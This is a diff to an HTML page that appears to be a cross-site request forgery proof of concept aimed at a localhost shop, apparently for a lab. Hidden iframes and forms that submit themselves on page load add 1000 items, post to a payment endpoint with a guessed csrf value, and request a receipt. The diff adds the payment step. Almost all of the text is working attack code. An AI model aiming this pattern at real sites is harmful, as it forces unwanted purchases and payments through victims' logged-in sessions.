@@ -8,6 +8,7 @@
 	<iframe style="display:none" name="csrfItem1"></iframe>
 	<iframe style="display:none" name="csrfItem2"></iframe>
 	<iframe style="display:none" name="csrfPay"></iframe>
+	<iframe style="display:none" name="csrfpayment"></iframe>
 
 		<form id="item1-form" method="post" action="https://localhost/" target="csrfItem1">
 			<input type=hidden name=nbrOfItems value=1000>
@@ -20,7 +21,10 @@
 			<input type=hidden name=itemid value=1>
 		</form>
 		<script>document.getElementById("item2-form").submit()</script>
-
+		<form id="payment-form" method="post" action="https://localhost/payment" target="csrfpayment">
+			<input type=hidden name=csrf value=2>
+		</form>
+		<script>document.getElementById("payment-form").submit()</script>
 		<form id="pay-form" name="payment" method="post" action="https://localhost/receipt/" target="csrfPay">
 		</form>
 		<script>document.getElementById("pay-form").submit()</script>
